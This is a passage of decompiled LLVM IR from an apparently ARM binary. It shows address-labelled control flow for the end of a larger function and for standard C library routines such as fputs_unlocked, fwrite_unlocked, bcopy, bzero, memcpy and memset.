dec_label_pc_247a4:                               ; preds = %dec_label_pc_246f8
  %v0_247a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_247a4 = add i32 %v0_247a4, 28
  %v2_247a4 = inttoptr i32 %v1_247a4 to i32*
  %v3_247a4 = load i32, i32* %v2_247a4, align 4
  store i32 %v3_247a4, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_247ac = add i32 %v0_247a4, 38
  %v4_247ac = inttoptr i32 %v3_247ac to i8*
  store i8 1, i8* %v4_247ac, align 1
  %v0_247b0 = load i32, i32* %r2.global-to-local, align 4
  %v3_247b0 = mul i32 %v0_247b0, 4
  store i32 %v3_247b0, i32* @r2, align 4
  %v0_247b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_247b4 = add i32 %v0_247b4, 40
  store i32 %v1_247b4, i32* @r0, align 4
  %v2_247b8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_247b8, i32* @r1, align 4
  %v0_247bc = call i32 @memcpy()
  store i32 %v0_247bc, i32* %r0.global-to-local, align 4
  %v0_247c0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_247c0

dec_label_pc_247c0:                               ; preds = %dec_label_pc_2478c, %dec_label_pc_247a4
  %v2_247dc = phi i32 [ %v0_247c0.pre, %dec_label_pc_247a4 ], [ %v0_2478c, %dec_label_pc_2478c ]
  %v1_247c0 = add i32 %v2_247dc, 16
  %v2_247c0 = inttoptr i32 %v1_247c0 to i32*
  %v3_247c0 = load i32, i32* %v2_247c0, align 4
  store i32 %v3_247c0, i32* %r3.global-to-local, align 4
  %v1_247c4 = and i32 %v3_247c0, 128
  %v2_247c4 = icmp eq i32 %v1_247c4, 0
  br i1 %v2_247c4, label %.thread50, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_247c0
  %v3_247c8 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_247c8, i32* %r3.global-to-local, align 4
  %v2_247cc = inttoptr i32 %v2_247dc to i32*
  %v3_247cc = load i32, i32* %v2_247cc, align 4
  %v2_247d4.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_247d4 = sub i32 %v2_247d4.pre, %v3_247c8
  store i32 %v3_247d4, i32* %r3.global-to-local, align 4
  %v5_247d8 = mul i32 %v3_247d4, 4
  %v6_247d8 = add i32 %v5_247d8, %v3_247cc
  store i32 %v6_247d8, i32* @r2, align 4
  br label %bb160

.thread50:                                        ; preds = %dec_label_pc_247c0
  %v1_247d045 = load i32, i32* %r6.global-to-local, align 4
  %v2_247d046 = add i32 %v1_247d045, 1
  store i32 %v2_247d046, i32* %r3.global-to-local, align 4
  %v3_247dc = inttoptr i32 %v2_247dc to i32*
  store i32 %v2_247d046, i32* %v3_247dc, align 4
  %v0_247e0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb160

bb160:                                            ; preds = %.thread48, %.thread50
  %v1_247e8 = phi i32 [ %v2_247dc, %.thread48 ], [ %v0_247e0.pre, %.thread50 ]
  %v1_247e0 = add i32 %v1_247e8, 28
  %v2_247e0 = inttoptr i32 %v1_247e0 to i32*
  %v3_247e0 = load i32, i32* %v2_247e0, align 4
  store i32 %v3_247e0, i32* %r3.global-to-local, align 4
  %v1_247e4 = add i32 %v3_247e0, 2
  store i32 %v1_247e4, i32* %r0.global-to-local, align 4
  %v0_247e8 = load i32, i32* %fp.global-to-local, align 4
  %v2_247e8 = add i32 %v1_247e8, 24
  %v3_247e8 = inttoptr i32 %v2_247e8 to i32*
  store i32 %v0_247e8, i32* %v3_247e8, align 4
  br i1 %v2_247c4, label %dec_label_pc_247f8, label %bb161

bb161:                                            ; preds = %bb160
  %v1_247ec = load i32, i32* @r2, align 4
  %v2_247ec = load i32, i32* %r7.global-to-local, align 4
  %v3_247ec = inttoptr i32 %v2_247ec to i32*
  store i32 %v1_247ec, i32* %v3_247ec, align 4
  br label %dec_label_pc_247f8

dec_label_pc_247f4:                               ; preds = %dec_label_pc_246e8, %dec_label_pc_24308, %dec_label_pc_24450, %dec_label_pc_244fc, %dec_label_pc_244d4, %dec_label_pc_244e0, %dec_label_pc_2441c, %dec_label_pc_24734, %dec_label_pc_246b4, %.thread24
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_247f8

dec_label_pc_247f8:                               ; preds = %bb161, %bb160, %dec_label_pc_247f4
  %v2_247fc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_247fc, i32* @r4, align 4
  store i32 %v6_242c4, i32* @r5, align 4
  store i32 %v27_242c4, i32* @lr, align 4
  %v1_24800 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_24800

; uselistorder directives
  uselistorder i32 %v3_247d4, { 1, 0 }
  uselistorder i32 %v1_24790, { 1, 2, 0 }
  uselistorder i32 %v2_2472c, { 1, 0 }
  uselistorder i32 %v1_2472c, { 1, 0, 2 }
  uselistorder i32 %v0_2474c, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_24724, { 0, 2, 1, 3 }
  uselistorder i32 %v1_246e8, { 1, 2, 0 }
  uselistorder i32 %v0_246d8, { 1, 0 }
  uselistorder i32 %v1_246b4, { 1, 0, 2 }
  uselistorder i32 %v1_24628, { 1, 2, 0 }
  uselistorder i32 %v1_24610, { 1, 0 }
  uselistorder i32 %v2_245f8, { 2, 1, 0 }
  uselistorder i32 %v1_245dc, { 0, 2, 3, 1 }
  uselistorder i32 %v0_245d4, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_245b8, { 1, 0, 2 }
  uselistorder i32 %v2_245a0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_24594, { 2, 1, 0 }
  uselistorder i32 %v1_24554, { 0, 2, 3, 1 }
  uselistorder i32 %v0_24544.pre, { 0, 2, 1 }
  uselistorder i32 %v2_24520, { 1, 0 }
  uselistorder i32 %v5_24480, { 0, 1, 3, 2 }
  uselistorder i32 %v0_24480, { 1, 0 }
  uselistorder i32 %v0_2448476, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_24428, { 1, 0 }
  uselistorder i32 %v0_24448, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_2440c, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_243f4, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_243e4, { 1, 0 }
  uselistorder i32 %v3_243dc, { 0, 2, 1 }
  uselistorder i8 %v2_243dc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_2445c, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_243a0, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_2438c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_24374, { 1, 0 }
  uselistorder i32 %v3_24380.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_24328, { 0, 2, 1 }
  uselistorder i32 %v2_24314, { 1, 0, 2 }
  uselistorder i32 %v0_242c8, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 3, 2, 1, 4, 8, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20 }
  uselistorder i32* %r6.global-to-local, { 9, 12, 11, 14, 10, 2, 3, 13, 4, 15, 5, 6, 7, 8, 0, 1, 16 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 52, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 18, 47, 50, 51, 48, 49, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 24, 25, 23, 18, 26, 19, 20, 21, 27, 22, 28, 0, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 604, { 1, 2, 0 }
  uselistorder i32 -37428, { 0, 2, 1, 3 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder label %dec_label_pc_247f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_247f4, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_247c0, { 1, 0 }
  uselistorder label %dec_label_pc_2478c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_24784, { 0, 2, 1 }
  uselistorder label %dec_label_pc_24740, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_246f8, { 1, 0, 2 }
  uselistorder label %bb152, { 2, 1, 0 }
  uselistorder label %.thread24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2450c, { 1, 0 }
  uselistorder label %dec_label_pc_244c0, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_2443c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_24438, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_243d8, { 1, 0 }
  uselistorder label %dec_label_pc_243d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_243d8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_24378, { 1, 0 }
  uselistorder label %dec_label_pc_2434c, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_24834 = load i32, i32* @r4, align 4
  store i32 %v3_24834, i32* %stack_var_-16, align 4
  %v6_24834 = load i32, i32* @r5, align 4
  %v9_24834 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_24840 = call i32 @strlen(i8* %arg1)
  store i32 %v3_24840, i32* @r6, align 4
  %v0_24848 = load i32, i32* @r5, align 4
  %v0_2484c = load i32, i32* @r4, align 4
  %v5_24858 = inttoptr i32 %v0_24848 to i16*
  %v6_24858 = call i32 @__GI_fwrite_unlocked(i32 %v0_2484c, i32 1, i32 %v3_24840, i16* %v5_24858)
  %v1_2485c = load i32, i32* @r6, align 4
  %v9_2485c = icmp eq i32 %v6_24858, %v1_2485c
  br i1 %v9_2485c, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v1_24868 = phi i32 [ %v6_24858, %entry ], [ -1, %bb ]
  %v2_24864 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_24864, i32* @r4, align 4
  store i32 %v6_24834, i32* @r5, align 4
  store i32 %v9_24834, i32* @r6, align 4
  ret i32 %v1_24868

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v9_2486c = load i32, i32* @r6, align 4
  %v12_2486c = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_24874 = load i16, i16* %arg4, align 2
  %v1_24878 = and i16 %v3_24874, 192
  %v2_2487c = icmp eq i16 %v1_24878, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_2487c, label %dec_label_pc_248a8, label %dec_label_pc_24894

dec_label_pc_24894:                               ; preds = %entry
  store i32 128, i32* %r1.global-to-local, align 4
  %v4_2489c = call i32 @__stdio_trans2w_o(i16* nonnull %arg4, i32 128)
  %v2_248a0 = icmp eq i32 %v4_2489c, 0
  br i1 %v2_248a0, label %dec_label_pc_248a8thread-pre-split, label %dec_label_pc_24910

dec_label_pc_248a8thread-pre-split:               ; preds = %dec_label_pc_24894
  %v0_248a8.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_248a8

dec_label_pc_248a8:                               ; preds = %dec_label_pc_248a8thread-pre-split, %entry
  %v0_248cc = phi i32 [ %v0_248a8.pr, %dec_label_pc_248a8thread-pre-split ], [ %arg2, %entry ]
  %v2_248a8 = icmp eq i32 %v0_248cc, 0
  br i1 %v2_248a8, label %dec_label_pc_24910, label %bb

bb:                                               ; preds = %dec_label_pc_248a8
  %v1_248ac = load i32, i32* @r6, align 4
  %v3_248ac = icmp eq i32 %v1_248ac, 0
  br i1 %v3_248ac, label %dec_label_pc_24910, label %dec_label_pc_248b4

dec_label_pc_248b4:                               ; preds = %bb
  store i32 %v0_248cc, i32* %r1.global-to-local, align 4
  %v2_248bc = udiv i32 -1, %v0_248cc
  %tmp9 = icmp ugt i32 %v1_248ac, %v2_248bc
  %v0_248e8 = load i32, i32* @r5, align 4
  %v1_248e8 = inttoptr i32 %v0_248e8 to i16*
  br i1 %tmp9, label %dec_label_pc_248e8, label %dec_label_pc_248c8

dec_label_pc_248c8:                               ; preds = %dec_label_pc_248b4
  %v2_248cc = mul i32 %v1_248ac, %v0_248cc
  store i32 %v2_248cc, i32* %r1.global-to-local, align 4
  %v0_248d0 = load i32, i32* @r7, align 4
  %v5_248d4 = call i32 @__stdio_fwrite(i32 %v0_248d0, i32 %v2_248cc, i16* %v1_248e8)
  %v0_248d8 = load i32, i32* @r4, align 4
  %v2_248dc = udiv i32 %v5_248d4, %v0_248d8
  store i32 %v2_248dc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_24914

dec_label_pc_248e8:                               ; preds = %dec_label_pc_248b4
  %v2_248e8 = load i16, i16* %v1_248e8, align 2
  %v1_248ec = or i16 %v2_248e8, 8
  store i16 %v1_248ec, i16* %v1_248e8, align 2
  %v0_248f8 = call i32 @__aeabi_read_tp()
  %v3_248fc = load i16, i16* @global_var_42934.3040, align 2
  %v4_248fc = sext i16 %v3_248fc to i32
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_24908 = add i32 %v4_248fc, %v0_248f8
  %v4_24908 = inttoptr i32 %v3_24908 to i32*
  store i32 22, i32* %v4_24908, align 4
  %v0_24914.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_24914

dec_label_pc_24910:                               ; preds = %dec_label_pc_248a8, %dec_label_pc_24894, %bb
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_24914

dec_label_pc_24914:                               ; preds = %dec_label_pc_248e8, %dec_label_pc_248c8, %dec_label_pc_24910
  %v0_24914 = phi i32 [ %v0_24914.pre, %dec_label_pc_248e8 ], [ %v2_248dc, %dec_label_pc_248c8 ], [ 0, %dec_label_pc_24910 ]
  store i32 %v9_2486c, i32* @r6, align 4
  store i32 %v12_2486c, i32* @r7, align 4
  ret i32 %v0_24914

; uselistorder directives
  uselistorder i16* %v1_248e8, { 0, 2, 1 }
  uselistorder i32 %v1_248ac, { 1, 0, 2 }
  uselistorder i32 %v0_248cc, { 0, 2, 1, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_24914, { 2, 0, 1 }
  uselistorder label %dec_label_pc_24910, { 2, 0, 1 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v2_2493c = inttoptr i32 %arg2 to i8*
  %v3_2493c = call i32 @_memcpy(i8* %v2_2493c, i32 %arg1)
  ret i32 %v3_2493c
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_24948 = load i32, i32* @r0, align 4
  %v3_24948 = inttoptr i32 %v0_24948 to i8*
  %v4_24948 = call i32 @__GI_memset(i8* %v3_24948, i32 0, i32 %arg1)
  ret i32 %v4_24948
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_24950 = load i32, i32* @r0, align 4
  %v1_24950 = load i32, i32* @r1, align 4
  %v2_24950 = inttoptr i32 %v0_24950 to i8*
  %v3_24950 = call i32 @_memcpy(i8* %v2_24950, i32 %v1_24950)
  ret i32 %v3_24950
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_24964 = icmp eq i32 %arg3, 8
  store i1 %v8_24964, i1* %cpsr_z.global-to-local, align 1
  %v5_24968 = icmp slt i32 %arg3, 8
  br i1 %v5_24968, label %dec_label_pc_249c8, label %dec_label_pc_2496c

dec_label_pc_2496c:                               ; preds = %entry
  %v4_2496c = mul i32 %arg2, 256
  %v5_2496c = or i32 %v4_2496c, %arg2
  %v4_24970 = mul i32 %v5_2496c, 65536
  %v5_24970 = or i32 %v4_24970, %v5_2496c
  store i32 %v5_24970, i32* %r1.global-to-local, align 4
  %v1_2497457 = urem i32 %tmp, 4
  %v2_2497458 = icmp eq i32 %v1_2497457, 0
  store i1 %v2_2497458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_2497458, label %dec_label_pc_24984, label %bb

bb:                                               ; preds = %dec_label_pc_2496c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_2496c ]
  %v3_2497859 = phi i32 [ %v6_24978, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_2496c ]
  %v4_24978 = inttoptr i32 %v3_2497859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_24978, align 1
  %v5_24978 = load i32, i32* @r3, align 4
  %v6_24978 = add i32 %v5_24978, 1
  store i32 %v6_24978, i32* @r3, align 4
  %v0_2497c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_24988.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_2497c.pr, label %dec_label_pc_24984, label %.thread

.thread:                                          ; preds = %bb
  %v2_2497c = add i32 %v0_24988.pr.pre, -1
  store i32 %v2_2497c, i32* @r2, align 4
  %v1_24974 = urem i32 %v6_24978, 4
  %v2_24974 = icmp eq i32 %v1_24974, 0
  store i1 %v2_24974, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_24974, label %dec_label_pc_24984, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_24978.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_24978.pre to i8
  br label %bb

dec_label_pc_24984:                               ; preds = %.thread, %bb, %dec_label_pc_2496c
  %v0_2499028 = phi i32 [ %tmp, %dec_label_pc_2496c ], [ %v6_24978, %bb ], [ %v6_24978, %.thread ]
  %v0_24988.pr = phi i32 [ %arg3, %dec_label_pc_2496c ], [ %v0_24988.pr.pre, %bb ], [ %v2_2497c, %.thread ]
  %v0_24984 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_24984, i32* @ip, align 4
  %v8_2498810 = icmp eq i32 %v0_24988.pr, 8
  store i1 %v8_2498810, i1* %cpsr_z.global-to-local, align 1
  %v5_2498c11 = icmp slt i32 %v0_24988.pr, 8
  br i1 %v5_2498c11, label %dec_label_pc_249c8, label %dec_label_pc_24990.preheader

dec_label_pc_24990.preheader:                     ; preds = %dec_label_pc_24984
  %v1_2499046 = inttoptr i32 %v0_2499028 to i32*
  store i32 %v0_24984, i32* %v1_2499046, align 4
  %v3_2499047 = add i32 %v0_2499028, 4
  %v4_2499048 = inttoptr i32 %v3_2499047 to i32*
  %v5_2499049 = load i32, i32* @ip, align 4
  store i32 %v5_2499049, i32* %v4_2499048, align 4
  %v6_2499050 = add i32 %v0_2499028, 8
  store i32 %v6_2499050, i32* @r3, align 4
  %v0_2499451 = load i32, i32* @r2, align 4
  %v1_2499452 = add i32 %v0_2499451, -8
  store i32 %v1_2499452, i32* @r2, align 4
  %v5_2499c53 = icmp slt i32 %v1_2499452, 8
  br i1 %v5_2499c53, label %dec_label_pc_24990.dec_label_pc_249c8.loopexit_crit_edge, label %dec_label_pc_249a0

dec_label_pc_249a0:                               ; preds = %dec_label_pc_24990.preheader, %dec_label_pc_24988.dec_label_pc_24990_crit_edge
  %v6_2499055 = phi i32 [ %v6_24990, %dec_label_pc_24988.dec_label_pc_24990_crit_edge ], [ %v6_2499050, %dec_label_pc_24990.preheader ]
  %v0_2499054 = phi i32 [ %v12_249bc, %dec_label_pc_24988.dec_label_pc_24990_crit_edge ], [ %v0_2499028, %dec_label_pc_24990.preheader ]
  %v1_249a0 = inttoptr i32 %v6_2499055 to i32*
  %v2_249a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_249a0, i32* %v1_249a0, align 4
  %v3_249a0 = add i32 %v0_2499054, 12
  %v4_249a0 = inttoptr i32 %v3_249a0 to i32*
  %v5_249a0 = load i32, i32* @ip, align 4
  store i32 %v5_249a0, i32* %v4_249a0, align 4
  %v6_249a0 = add i32 %v0_2499054, 16
  store i32 %v6_249a0, i32* @r3, align 4
  %v0_249a4 = load i32, i32* @r2, align 4
  %v1_249a4 = add i32 %v0_249a4, -8
  store i32 %v1_249a4, i32* @r2, align 4
  %v5_249ac = icmp slt i32 %v1_249a4, 8
  br i1 %v5_249ac, label %dec_label_pc_249a0.dec_label_pc_249c8.loopexit_crit_edge, label %dec_label_pc_249b0

dec_label_pc_249b0:                               ; preds = %dec_label_pc_249a0
  %v1_249b0 = inttoptr i32 %v6_249a0 to i32*
  %v2_249b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_249b0, i32* %v1_249b0, align 4
  %v3_249b0 = add i32 %v0_2499054, 20
  %v4_249b0 = inttoptr i32 %v3_249b0 to i32*
  %v5_249b0 = load i32, i32* @ip, align 4
  store i32 %v5_249b0, i32* %v4_249b0, align 4
  %v6_249b0 = add i32 %v0_2499054, 24
  store i32 %v6_249b0, i32* @r3, align 4
  %v0_249b4 = load i32, i32* @r2, align 4
  %v1_249b4 = add i32 %v0_249b4, -8
  store i32 %v1_249b4, i32* @r2, align 4
  %v5_249bc = icmp slt i32 %v1_249b4, 8
  br i1 %v5_249bc, label %dec_label_pc_249b0.dec_label_pc_249c8.loopexit_crit_edge, label %dec_label_pc_24988

dec_label_pc_24988:                               ; preds = %dec_label_pc_249b0
  %v7_249bc = inttoptr i32 %v6_249b0 to i32*
  %v8_249bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_249bc, i32* %v7_249bc, align 4
  %v9_249bc = add i32 %v0_2499054, 28
  %v10_249bc = inttoptr i32 %v9_249bc to i32*
  %v11_249bc = load i32, i32* @ip, align 4
  store i32 %v11_249bc, i32* %v10_249bc, align 4
  %v12_249bc = add i32 %v0_2499054, 32
  store i32 %v12_249bc, i32* @r3, align 4
  %v6_249c0 = load i32, i32* @r2, align 4
  %v7_249c0 = add i32 %v6_249c0, -8
  store i32 %v7_249c0, i32* @r2, align 4
  %v5_2498c = icmp slt i32 %v7_249c0, 8
  br i1 %v5_2498c, label %dec_label_pc_24988.dec_label_pc_249c8.loopexit_crit_edge, label %dec_label_pc_24988.dec_label_pc_24990_crit_edge

dec_label_pc_24988.dec_label_pc_24990_crit_edge:  ; preds = %dec_label_pc_24988
  %v2_24990.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_24990 = inttoptr i32 %v12_249bc to i32*
  store i32 %v2_24990.pre, i32* %v1_24990, align 4
  %v3_24990 = add i32 %v0_2499054, 36
  %v4_24990 = inttoptr i32 %v3_24990 to i32*
  %v5_24990 = load i32, i32* @ip, align 4
  store i32 %v5_24990, i32* %v4_24990, align 4
  %v6_24990 = add i32 %v0_2499054, 40
  store i32 %v6_24990, i32* @r3, align 4
  %v0_24994 = load i32, i32* @r2, align 4
  %v1_24994 = add i32 %v0_24994, -8
  store i32 %v1_24994, i32* @r2, align 4
  %v5_2499c = icmp slt i32 %v1_24994, 8
  br i1 %v5_2499c, label %dec_label_pc_24990.dec_label_pc_249c8.loopexit_crit_edge, label %dec_label_pc_249a0

dec_label_pc_24988.dec_label_pc_249c8.loopexit_crit_edge: ; preds = %dec_label_pc_24988
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_249c8

dec_label_pc_24990.dec_label_pc_249c8.loopexit_crit_edge: ; preds = %dec_label_pc_24988.dec_label_pc_24990_crit_edge, %dec_label_pc_24990.preheader
  %v1_24994.lcssa = phi i32 [ %v1_2499452, %dec_label_pc_24990.preheader ], [ %v1_24994, %dec_label_pc_24988.dec_label_pc_24990_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_249c8

dec_label_pc_249a0.dec_label_pc_249c8.loopexit_crit_edge: ; preds = %dec_label_pc_249a0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_249c8

dec_label_pc_249b0.dec_label_pc_249c8.loopexit_crit_edge: ; preds = %dec_label_pc_249b0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_249c8

dec_label_pc_249c8:                               ; preds = %dec_label_pc_24984, %dec_label_pc_24988.dec_label_pc_249c8.loopexit_crit_edge, %dec_label_pc_24990.dec_label_pc_249c8.loopexit_crit_edge, %dec_label_pc_249a0.dec_label_pc_249c8.loopexit_crit_edge, %dec_label_pc_249b0.dec_label_pc_249c8.loopexit_crit_edge, %entry
  %v0_249d0 = phi i32 [ %arg3, %entry ], [ %v1_249b4, %dec_label_pc_249b0.dec_label_pc_249c8.loopexit_crit_edge ], [ %v1_249a4, %dec_label_pc_249a0.dec_label_pc_249c8.loopexit_crit_edge ], [ %v1_24994.lcssa, %dec_label_pc_24990.dec_label_pc_249c8.loopexit_crit_edge ], [ %v7_249c0, %dec_label_pc_24988.dec_label_pc_249c8.loopexit_crit_edge ], [ %v0_24988.pr, %dec_label_pc_24984 ]
  %v2_249c8 = icmp eq i32 %v0_249d0, 0
  store i1 %v2_249c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_249c8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_249c8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_249c8
  %v1_249d0 = sub i32 7, %v0_249d0
  store i32 %v1_249d0, i32* @r2, align 4
  %v3_249d4 = mul i32 %v1_249d0, 4
  %v4_249d4 = add i32 %v3_249d4, ptrtoint (i32* @global_var_249dc.3120 to i32)
  call void @__pseudo_branch(i32 %v4_249d4)
  %v0_249dc = load i32, i32* %r1.global-to-local, align 4
  %v1_249dc = trunc i32 %v0_249dc to i8
  %v2_249dc = load i32, i32* @r3, align 4
  %v3_249dc = inttoptr i32 %v2_249dc to i8*
  store i8 %v1_249dc, i8* %v3_249dc, align 1
  %v4_249dc = load i32, i32* @r3, align 4
  %v5_249dc = add i32 %v4_249dc, 1
  store i32 %v5_249dc, i32* %r3.global-to-local, align 4
  %v0_249e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_249e0 = trunc i32 %v0_249e0 to i8
  %v3_249e0 = inttoptr i32 %v5_249dc to i8*
  store i8 %v1_249e0, i8* %v3_249e0, align 1
  %v4_249e0 = load i32, i32* %r3.global-to-local, align 4
  %v5_249e0 = add i32 %v4_249e0, 1
  store i32 %v5_249e0, i32* %r3.global-to-local, align 4
  %v0_249e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_249e4 = trunc i32 %v0_249e4 to i8
  %v3_249e4 = inttoptr i32 %v5_249e0 to i8*
  store i8 %v1_249e4, i8* %v3_249e4, align 1
  %v4_249e4 = load i32, i32* %r3.global-to-local, align 4
  %v5_249e4 = add i32 %v4_249e4, 1
  store i32 %v5_249e4, i32* %r3.global-to-local, align 4
  %v0_249e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_249e8 = trunc i32 %v0_249e8 to i8
  %v3_249e8 = inttoptr i32 %v5_249e4 to i8*
  store i8 %v1_249e8, i8* %v3_249e8, align 1
  %v4_249e8 = load i32, i32* %r3.global-to-local, align 4
  %v5_249e8 = add i32 %v4_249e8, 1
  store i32 %v5_249e8, i32* %r3.global-to-local, align 4
  %v0_249ec = load i32, i32* %r1.global-to-local, align 4
  %v1_249ec = trunc i32 %v0_249ec to i8
  %v3_249ec = inttoptr i32 %v5_249e8 to i8*
